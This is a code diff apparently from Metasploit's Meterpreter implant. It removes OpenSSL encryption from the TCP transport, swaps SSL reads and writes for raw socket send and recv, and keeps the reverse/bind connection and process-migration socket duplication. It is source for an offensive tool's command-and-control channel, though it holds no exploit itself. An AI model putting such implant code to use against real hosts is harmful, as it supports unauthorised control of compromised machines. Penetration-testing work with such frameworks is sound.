@@ -22,9 +22,6 @@ typedef struct _TCPMIGRATECONTEXT
 extern IN6_ADDR in6addr_any;
 #endif
 
-/*! @brief An array of locks for use by OpenSSL. */
-static LOCK ** ssl_locks = NULL;
-
 /*!
  * @brief Perform the reverse_tcp connect.
  * @param reverseSocket The existing socket that refers to the remote host connection, closed on failure.
@@ -275,79 +272,7 @@ static DWORD bind_tcp(u_short port, SOCKET* socketBuffer)
 }
 
 /*!
- * @brief A callback function used by OpenSSL to leverage native system locks.
- * @param mode The lock mode to set.
- * @param type The lock type to operate on.
- * @param file Unused.
- * @param line Unused.
- */
-static VOID server_locking_callback(int mode, int type, const char * file, int line)
-{
-	if (mode & CRYPTO_LOCK)
-	{
-		lock_acquire(ssl_locks[type]);
-	}
-	else
-	{
-		lock_release(ssl_locks[type]);
-	}
-}
-
-/*!
- * @brief A callback function used by OpenSSL to get the current threads id.
- * @returns The current thread ID.
- * @remarks While not needed on windows this must be used for posix meterpreter.
- */
-static long unsigned int server_threadid_callback(VOID)
-{
-	return GetCurrentThreadId();
-}
-
-/*!
- * @brief A callback function for dynamic lock creation for OpenSSL.
- * @returns A pointer to a lock that can be used for synchronisation.
- * @param file _Ignored_
- * @param line _Ignored_
- */
-static struct CRYPTO_dynlock_value* server_dynamiclock_create(const char * file, int line)
-{
-	return (struct CRYPTO_dynlock_value*)lock_create();
-}
-
-/*!
- * @brief A callback function for dynamic lock locking for OpenSSL.
- * @param mode A bitmask which indicates the lock mode.
- * @param l A point to the lock instance.
- * @param file _Ignored_
- * @param line _Ignored_
- */
-static void server_dynamiclock_lock(int mode, struct CRYPTO_dynlock_value* l, const char* file, int line)
-{
-	LOCK* lock = (LOCK *)l;
-
-	if (mode & CRYPTO_LOCK)
-	{
-		lock_acquire(lock);
-	}
-	else
-	{
-		lock_release(lock);
-	}
-}
-
-/*!
- * @brief A callback function for dynamic lock destruction for OpenSSL.
- * @param l A point to the lock instance.
- * @param file _Ignored_
- * @param line _Ignored_
- */
-static void server_dynamiclock_destroy(struct CRYPTO_dynlock_value* l, const char * file, int line)
-{
-	lock_destroy((LOCK*)l);
-}
-
-/*!
- * @brief Flush all pending data on the connected socket before doing SSL.
+ * @brief Flush all pending data on the connected socket
  * @param remote Pointer to the remote instance.
  */
 static VOID server_socket_flush(Transport* transport)
@@ -420,168 +345,12 @@ static LONG server_socket_poll(Remote* remote, long timeout)
 }
 
 /*!
- * @brief Initialize the OpenSSL subsystem for use in a multi threaded enviroment.
- * @param transport Pointer to the transport instance.
- * @return Indication of success or failure.
- */
-static BOOL server_initialize_ssl(Transport* transport)
-{
-	int i = 0;
-
-	lock_acquire(transport->lock);
-
-	// Begin to bring up the OpenSSL subsystem...
-	CRYPTO_malloc_init();
-	SSL_load_error_strings();
-	SSL_library_init();
-
-	// Setup the required OpenSSL multi-threaded enviroment...
-	ssl_locks = (LOCK**)malloc(CRYPTO_num_locks() * sizeof(LOCK *));
-	if (ssl_locks == NULL)
-	{
-		lock_release(transport->lock);
-		return FALSE;
-	}
-
-	for (i = 0; i < CRYPTO_num_locks(); i++)
-	{
-		ssl_locks[i] = lock_create();
-	}
-
-	CRYPTO_set_id_callback(server_threadid_callback);
-	CRYPTO_set_locking_callback(server_locking_callback);
-	CRYPTO_set_dynlock_create_callback(server_dynamiclock_create);
-	CRYPTO_set_dynlock_lock_callback(server_dynamiclock_lock);
-	CRYPTO_set_dynlock_destroy_callback(server_dynamiclock_destroy);
-
-	lock_release(transport->lock);
-
-	return TRUE;
-}
-
-/*!
- * @brief Bring down the OpenSSL subsystem
- * @param transport Pointer to the transport instance.
- * @return Indication of success or failure.
- */
-static BOOL server_destroy_ssl(Transport* transport)
-{
-	int i = 0;
-	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
-
-	dprintf("[SERVER] Destroying SSL");
-
-	lock_acquire(transport->lock);
-
-	dprintf("[SERVER] Freeing ssl %p", ctx->ssl);
-	SSL_free(ctx->ssl);
-
-	dprintf("[SERVER] Freeing context %p", ctx->ctx);
-	SSL_CTX_free(ctx->ctx);
-
-	CRYPTO_set_locking_callback(NULL);
-	CRYPTO_set_id_callback(NULL);
-	CRYPTO_set_dynlock_create_callback(NULL);
-	CRYPTO_set_dynlock_lock_callback(NULL);
-	CRYPTO_set_dynlock_destroy_callback(NULL);
-
-	dprintf("[SERVER] Destroying locks");
-	for (i = 0; i < CRYPTO_num_locks(); i++)
-	{
-		lock_destroy(ssl_locks[i]);
-	}
-
-	dprintf("[SERVER] Freeing locks %p", ssl_locks);
-	free(ssl_locks);
-
-	lock_release(transport->lock);
-
-	dprintf("[SERVER] Finished destroying SSL");
-
-	return TRUE;
-}
-
-/*!
- * @brief Negotiate SSL on the socket.
- * @param transport Pointer to the transport instance.
- * @return Indication of success or failure.
- */
-static BOOL server_negotiate_ssl(Transport* transport)
-{
-	TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
-	BOOL success = TRUE;
-	SOCKET fd = 0;
-	DWORD ret = 0;
-	DWORD res = 0;
-
-	lock_acquire(transport->lock);
-
-	do
-	{
-		ctx->meth = TLSv1_client_method();
-
-		ctx->ctx = SSL_CTX_new(ctx->meth);
-		SSL_CTX_set_mode(ctx->ctx, SSL_MODE_AUTO_RETRY);
-
-		ctx->ssl = SSL_new(ctx->ctx);
-		dprintf("[SERVER] SSL = %p", ctx->ssl);
-		SSL_set_verify(ctx->ssl, SSL_VERIFY_NONE, NULL);
-
-		if (SSL_set_fd(ctx->ssl, (int)ctx->fd) == 0)
-		{
-			dprintf("[SERVER] set fd failed");
-			success = FALSE;
-			break;
-		}
-
-		do
-		{
-			if ((ret = SSL_connect(ctx->ssl)) != 1)
-			{
-				res = SSL_get_error(ctx->ssl, ret);
-				dprintf("[SERVER] connect failed %d", res);
-
-				if (res == SSL_ERROR_WANT_READ || res == SSL_ERROR_WANT_WRITE)
-				{
-					// Catch non-blocking socket errors and retry
-					continue;
-				}
-
-				success = FALSE;
-				break;
-			}
-		} while (ret != 1);
-
-		if (success == FALSE) break;
-
-		dprintf("[SERVER] Sending a HTTP GET request to the remote side...");
-
-		if ((ret = SSL_write(ctx->ssl, "GET /123456789 HTTP/1.0\r\n\r\n", 27)) <= 0)
-		{
-			dprintf("[SERVER] SSL write failed during negotiation with return: %d (%d)", ret, SSL_get_error(ctx->ssl, ret));
-		}
-
-	} while (0);
-
-	lock_release(transport->lock);
-
-	dprintf("[SERVER] Completed writing the HTTP GET request: %d", ret);
-
-	if (ret < 0)
-	{
-		success = FALSE;
-	}
-
-	return success;
-}
-
-/*!
  * @brief Receive a new packet on the given remote endpoint.
  * @param remote Pointer to the \c Remote instance.
  * @param packet Pointer to a pointer that will receive the \c Packet data.
  * @return An indication of the result of processing the transmission request.
  */
-static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
+static DWORD packet_receive(Remote *remote, Packet **packet)
 {
 	DWORD headerBytes = 0, payloadBytesLeft = 0, res;
 	Packet *localPacket = NULL;
@@ -599,16 +368,10 @@ static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
 		// Read the packet length
 		while (inHeader)
 		{
-			if ((bytesRead = SSL_read(ctx->ssl, ((PUCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes)) <= 0)
+			if ((bytesRead = recv(ctx->fd, ((PUCHAR)&header + headerBytes), sizeof(PacketHeader)-headerBytes, 0)) <= 0)
 			{
-				if (!bytesRead)
-				{
-					SetLastError(ERROR_NOT_FOUND);
-				}
-
 				if (bytesRead < 0)
 				{
-					dprintf("[PACKET] receive header failed with error code %d. SSLerror=%d, WSALastError=%d\n", bytesRead, SSL_get_error(ctx->ssl, bytesRead), WSAGetLastError());
 					SetLastError(ERROR_NOT_FOUND);
 				}
 
@@ -652,7 +415,7 @@ static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
 		// Read the payload
 		while (payloadBytesLeft > 0)
 		{
-			if ((bytesRead = SSL_read(ctx->ssl, payload + payloadLength - payloadBytesLeft, payloadBytesLeft)) <= 0)
+			if ((bytesRead = recv(ctx->fd, payload + payloadLength - payloadBytesLeft, payloadBytesLeft, 0)) <= 0)
 			{
 
 				if (GetLastError() == WSAEWOULDBLOCK)
@@ -660,14 +423,8 @@ static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
 					continue;
 				}
 
-				if (!bytesRead)
-				{
-					SetLastError(ERROR_NOT_FOUND);
-				}
-
 				if (bytesRead < 0)
 				{
-					dprintf("[PACKET] receive payload of length %d failed with error code %d. SSLerror=%d\n", payloadLength, bytesRead, SSL_get_error(ctx->ssl, bytesRead));
 					SetLastError(ERROR_NOT_FOUND);
 				}
 
@@ -726,7 +483,7 @@ static DWORD packet_receive_via_ssl(Remote *remote, Packet **packet)
 }
 
 /*!
- * @brief The servers main dispatch loop for incoming requests using SSL over TCP
+ * @brief The servers main dispatch loop for incoming requests using TCP
  * @param remote Pointer to the remote endpoint for this server connection.
  * @param dispatchThread Pointer to the main dispatch thread.
  * @returns Indication of success or failure.
@@ -753,7 +510,7 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
 		result = server_socket_poll(remote, 50000);
 		if (result > 0)
 		{
-			result = packet_receive_via_ssl(remote, &packet);
+			result = packet_receive(remote, &packet);
 			if (result != ERROR_SUCCESS)
 			{
 				dprintf("[DISPATCH] packet_receive returned %d, exiting dispatcher...", result);
@@ -802,7 +559,7 @@ static DWORD server_dispatch_tcp(Remote* remote, THREAD* dispatchThread)
  */
 static SOCKET transport_get_socket_tcp(Transport* transport)
 {
-	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
+	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
 		return ((TcpTransportContext*)transport->ctx)->fd;
 	}
@@ -816,7 +573,7 @@ static SOCKET transport_get_socket_tcp(Transport* transport)
  */
 static void transport_destroy_tcp(Transport* transport)
 {
-	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
+	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
 		dprintf("[TRANS TCP] Destroying tcp transport for url %S", transport->url);
 		SAFE_FREE(transport->url);
@@ -860,7 +617,7 @@ DWORD THREADCALL cleanup_socket(THREAD* thread)
  */
 static void transport_reset_tcp(Transport* transport, BOOL shuttingDown)
 {
-	if (transport && transport->type == METERPRETER_TRANSPORT_SSL)
+	if (transport && transport->type == METERPRETER_TRANSPORT_TCP)
 	{
 		TcpTransportContext* ctx = (TcpTransportContext*)transport->ctx;
 		dprintf("[TCP] Resetting transport from %u", ctx->fd);
@@ -968,34 +725,22 @@ static BOOL configure_tcp_connection(Transport* transport)
 	SetHandleInformation((HANDLE)ctx->fd, HANDLE_FLAG_INHERIT, 0);
 
 	dprintf("[SERVER] Flushing the socket handle...");
-	server_socket_flush(transport);
+	//server_socket_flush(transport);
 
 	transport->comms_last_packet = current_unix_timestamp();
-
-	dprintf("[SERVER] Initializing SSL...");
-	if (!server_initialize_ssl(transport))
-	{
-		return FALSE;
-	}
-
-	dprintf("[SERVER] Negotiating SSL...");
-	if (!server_negotiate_ssl(transport))
-	{
-		return FALSE;
-	}
 
 	return TRUE;
 }
 
 /*!
- * @brief Transmit a packet via SSL _and_ destroy it.
+ * @brief Transmit a packet via TCP _and_ destroy it.
  * @param remote Pointer to the \c Remote instance.
  * @param packet Pointer to the \c Packet that is to be sent.
  * @param completion Pointer to the completion routines to process.
  * @return An indication of the result of processing the transmission request.
- * @remark This uses an SSL-encrypted TCP channel, and does not imply the use of HTTPS.
+ * @remark This uses a TCP channel.
  */
-DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
+DWORD packet_transmit(Remote* remote, Packet* packet, PacketRequestCompletion* completion)
 {
 	Tlv requestId;
 	DWORD res;
@@ -1049,15 +794,10 @@ DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompl
 		while (idx < sizeof(packet->header))
 		{
 			// Transmit the packet's header (length, type)
-			res = SSL_write(
-				ctx->ssl,
-				(LPCSTR)(&packet->header) + idx,
-				sizeof(packet->header) - idx
-				);
+			res = send(ctx->fd, (LPCSTR)(&packet->header) + idx, sizeof(packet->header) - idx, 0);
 
 			if (res <= 0)
 			{
-				dprintf("[PACKET] transmit header failed with return %d at index %d\n", res, idx);
 				break;
 			}
 			idx += res;
@@ -1072,11 +812,7 @@ DWORD packet_transmit_via_ssl(Remote* remote, Packet* packet, PacketRequestCompl
 		while (idx < packet->payloadLength)
 		{
 			// Transmit the packet's payload (length, type)
-			res = SSL_write(
-				ctx->ssl,
-				packet->payload + idx,
-				packet->payloadLength - idx
-				);
+			res = send(ctx->fd, packet->payload + idx, packet->payloadLength - idx, 0);
 
 			if (res < 0)
 			{
@@ -1139,7 +875,7 @@ static DWORD get_migrate_context_tcp(Transport* transport, DWORD targetProcessId
 		return ERROR_OUTOFMEMORY;
 	}
 
-	// Duplicate the socket for the target process if we are SSL based
+	// Duplicate the socket for the target process
 	if (WSADuplicateSocketA(((TcpTransportContext*)transport->ctx)->fd, targetProcessId, &ctx->info) != NO_ERROR)
 	{
 		free(ctx);
@@ -1167,14 +903,13 @@ Transport* transport_create_tcp(MetsrvTransportTcp* config)
 	memset(transport, 0, sizeof(Transport));
 	memset(ctx, 0, sizeof(TcpTransportContext));
 
-	transport->type = METERPRETER_TRANSPORT_SSL;
+	transport->type = METERPRETER_TRANSPORT_TCP;
 	transport->timeouts.comms = config->common.comms_timeout;
 	transport->timeouts.retry_total = config->common.retry_total;
 	transport->timeouts.retry_wait = config->common.retry_wait;
 	transport->url = _wcsdup(config->common.url);
-	transport->packet_transmit = packet_transmit_via_ssl;
+	transport->packet_transmit = packet_transmit;
 	transport->transport_init = configure_tcp_connection;
-	transport->transport_deinit = server_destroy_ssl;
 	transport->transport_destroy = transport_destroy_tcp;
 	transport->transport_reset = transport_reset_tcp;
 	transport->server_dispatch = server_dispatch_tcp;
